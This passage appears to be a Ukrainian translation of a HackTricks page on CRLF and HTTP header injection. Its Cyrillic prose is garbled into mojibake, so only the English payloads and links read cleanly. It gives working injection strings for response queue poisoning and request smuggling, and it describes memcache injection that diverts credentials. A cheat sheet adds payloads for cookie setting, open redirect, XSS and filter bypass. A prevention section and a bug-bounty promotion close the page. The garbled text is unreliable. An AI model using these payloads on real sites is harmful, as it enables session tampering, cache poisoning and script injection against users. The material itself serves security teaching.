### –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ –¥–ª—è –≤–∏–∫–ª–∏–∫—É —Å–º—É–≥–ª–æ—Å—Ç—ñ –∑–∞–ø–∏—Ç—ñ–≤

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —Ç–∞ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –ø—Ä–æ–±–ª–µ–º–∏ [**–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–µ –¥–∂–µ—Ä–µ–ª–æ**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

–í–∏ –º–æ–∂–µ—Ç–µ –≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –≤–∞–∂–ª–∏–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏, —â–æ–± –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏, —â–æ **–∑–∞–¥–Ω—ñ–π –∫—ñ–Ω–µ—Ü—å —Ç—Ä–∏–º–∞—î –∑'—î–¥–Ω–∞–Ω–Ω—è –≤—ñ–¥–∫—Ä–∏—Ç–∏–º** –ø—ñ—Å–ª—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∫–∞–∑–∞—Ç–∏ –¥—Ä—É–≥–∏–π –∑–∞–ø–∏—Ç. –¶–µ–π —Å—Ü–µ–Ω–∞—Ä—ñ–π –∑–∞–∑–≤–∏—á–∞–π –≤–∫–ª—é—á–∞—î [HTTP request smuggling](http-request-smuggling/), —Ç–µ—Ö–Ω—ñ–∫—É, –¥–µ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∞–±–æ –µ–ª–µ–º–µ–Ω—Ç–∏ —Ç—ñ–ª–∞, –¥–æ–¥–∞–Ω—ñ —Å–µ—Ä–≤–µ—Ä–æ–º –ø—ñ—Å–ª—è —ñ–Ω'—î–∫—Ü—ñ—ó, –º–æ–∂—É—Ç—å –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Ä—ñ–∑–Ω–∏—Ö –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤ –±–µ–∑–ø–µ–∫–∏.

**–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è:**

1. **–í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ –ø—Ä–µ—Ñ—ñ–∫—Å—É**: –¶–µ–π –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –æ—Ç—Ä—É—î–Ω–Ω—è –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ –≤–µ–±-–∫–µ—à—É —à–ª—è—Ö–æ–º –≤–∫–∞–∑–∞–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ –ø—Ä–µ—Ñ—ñ–∫—Å—É. –ü—Ä–∏–∫–ª–∞–¥:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%a HTTP/1.1`

2. **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—Ä–µ—Ñ—ñ–∫—Å—É –¥–ª—è –æ—Ç—Ä—É—î–Ω–Ω—è —á–µ—Ä–≥–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π**: –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –ø–µ—Ä–µ–¥–±–∞—á–∞—î —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—Ä–µ—Ñ—ñ–∫—Å—É, —è–∫–∏–π, —É –ø–æ—î–¥–Ω–∞–Ω–Ω—ñ –∑ —Ö–≤–æ—Å—Ç–æ–≤–∏–º —Å–º—ñ—Ç—Ç—è–º, —Ñ–æ—Ä–º—É—î –ø–æ–≤–Ω–∏–π –¥—Ä—É–≥–∏–π –∑–∞–ø–∏—Ç. –¶–µ –º–æ–∂–µ —Å–ø—Ä–∏—á–∏–Ω–∏—Ç–∏ –æ—Ç—Ä—É—î–Ω–Ω—è —á–µ—Ä–≥–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π. –ü—Ä–∏–∫–ª–∞–¥:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –≤ Memcache

Memcache - —Ü–µ **—Å—Ö–æ–≤–∏—â–µ –∫–ª—é—á-–∑–Ω–∞—á–µ–Ω–Ω—è, —è–∫–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ—Ç–æ–∫–æ–ª —á—ñ—Ç–∫–æ–≥–æ —Ç–µ–∫—Å—Ç—É**. –î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ–≤–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ** [**–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –æ–ø–∏—Å**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

–Ø–∫—â–æ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –±–µ—Ä–µ **–¥–∞–Ω—ñ –∑ HTTP-–∑–∞–ø–∏—Ç—É —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —ó—Ö –±–µ–∑ —Å–∞–Ω—ñ—Ç–∞—Ä—ñ—ó–∑–∞—Ü—ñ—ó** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **–∑–∞–ø–∏—Ç—ñ–≤** –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ **memcache**, –∑–ª–æ—É–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º, —â–æ–± **–≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –Ω–æ–≤—ñ –∫–æ–º–∞–Ω–¥–∏ memcache**.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —É –≤–∏—è–≤–ª–µ–Ω–æ–º—É —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏—Å—è –∫–ª—é—á—ñ –∫–µ—à—É –¥–ª—è –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è IP —Ç–∞ –ø–æ—Ä—Ç—É, –¥–æ —è–∫–æ–≥–æ –º–∞–≤ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, —ñ –∑–ª–æ—É–º–∏—Å–Ω–∏–∫–∏ –º–æ–≥–ª–∏ **–≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ memcache**, —è–∫—ñ **–æ—Ç—Ä—É—é–≤–∞–ª–∏** **–∫–µ—à –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–∏—Ö –∂–µ—Ä—Ç–≤–∞–º** (–≤–∫–ª—é—á–∞—é—á–∏ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ) –Ω–∞ —Å–µ—Ä–≤–µ—Ä–∏ –∑–ª–æ—É–º–∏—Å–Ω–∏–∫–∞:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –¥–æ—Å–ª—ñ–¥–Ω–∏–∫–∏ —Ç–∞–∫–æ–∂ –≤–∏—è–≤–∏–ª–∏, —â–æ –≤–æ–Ω–∏ –º–æ–≥–ª–∏ —Ä–æ–∑—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ memcache, —â–æ–± –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ IP-–∞–¥—Ä–µ—Å–∏ —Ç–∞ –ø–æ—Ä—Ç–∏ –∑–ª–æ—É–º–∏—Å–Ω–∏–∫—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º, —á–∏—ó—Ö –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∏—Ö –∞–¥—Ä–µ—Å –∑–ª–æ—É–º–∏—Å–Ω–∏–∫ –Ω–µ –∑–Ω–∞–≤:

<figure><img src="../.gitbook/assets/image (40).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### –Ø–∫ –∑–∞–ø–æ–±—ñ–≥—Ç–∏ CRLF / –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ –≤ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∞—Ö

–î–ª—è –∑–º–µ–Ω—à–µ–Ω–Ω—è —Ä–∏–∑–∏–∫—ñ–≤ CRLF (–ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –∫–∞—Ä–µ—Ç–∫–∏ —Ç–∞ –ø–µ—Ä–µ—Ö—ñ–¥ –Ω–∞ –Ω–æ–≤–∏–π —Ä—è–¥–æ–∫) –∞–±–æ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ –≤ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∞—Ö —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Å—Ç—Ä–∞—Ç–µ–≥—ñ—ó:

1. **–£–Ω–∏–∫–∞–π—Ç–µ –ø—Ä—è–º–æ–≥–æ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π:** –ù–∞–π–±–µ–∑–ø–µ—á–Ω—ñ—à–∏–π –ø—ñ–¥—Ö—ñ–¥ - —É—Ç—Ä–∏–º—É–≤–∞—Ç–∏—Å—è –≤—ñ–¥ –≤–∫–ª—é—á–µ–Ω–Ω—è –≤–≤–µ–¥–µ–Ω–Ω—è, –Ω–∞–¥–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π.
2. **–ö–æ–¥—É–π—Ç–µ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ —Å–∏–º–≤–æ–ª–∏:** –Ø–∫—â–æ —É–Ω–∏–∫–Ω—É—Ç–∏ –ø—Ä—è–º–æ–≥–æ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–µ–º–æ–∂–ª–∏–≤–æ, –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ —Ñ—É–Ω–∫—Ü—ñ—é, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—É –¥–ª—è –∫–æ–¥—É–≤–∞–Ω–Ω—è —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ CR (–ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –∫–∞—Ä–µ—Ç–∫–∏) —Ç–∞ LF (–ø–µ—Ä–µ—Ö—ñ–¥ –Ω–∞ –Ω–æ–≤–∏–π —Ä—è–¥–æ–∫). –¶—è –ø—Ä–∞–∫—Ç–∏–∫–∞ –∑–∞–ø–æ–±—ñ–≥–∞—î –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è CRLF.
3. **–û–Ω–æ–≤–ª—é–π—Ç–µ –º–æ–≤—É –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è:** –†–µ–≥—É–ª—è—Ä–Ω–æ –æ–Ω–æ–≤–ª—é–π—Ç–µ –º–æ–≤—É –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è, —è–∫—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ —É –≤–∞—à–∏—Ö –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∞—Ö, –¥–æ –æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó. –í–∏–±–∏—Ä–∞–π—Ç–µ –≤–µ—Ä—Å—ñ—é, —è–∫–∞ –≤–±—É–¥–æ–≤–∞–Ω–æ –Ω–µ –¥–æ–∑–≤–æ–ª—è—î –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è —Å–∏–º–≤–æ–ª—ñ–≤ CR —Ç–∞ LF —É —Ñ—É–Ω–∫—Ü—ñ—è—Ö, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å –∑–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤.

### –®–ü–ê–†–ì–ê–õ–ö–ê

[–®–ø–∞—Ä–≥–∞–ª–∫–∞ —Ç—É—Ç](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## –°–ø–∏—Å–æ–∫ –í–∏—è–≤–ª–µ–Ω–Ω—è –ë—Ä—É—Ç—Ñ–æ—Ä—Å—É

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**–ü—ñ–¥–∫–∞–∑–∫–∞ —â–æ–¥–æ –±–∞–≥—ñ–≤**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—å** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ–∞–ª—å–Ω—ñ–π **–ø–ª–∞—Ç—Ñ–æ—Ä–º—ñ –¥–ª—è –ø–æ—à—É–∫—É –±–∞–≥—ñ–≤, —Å—Ç–≤–æ—Ä–µ–Ω—ñ–π —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ, —ñ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>
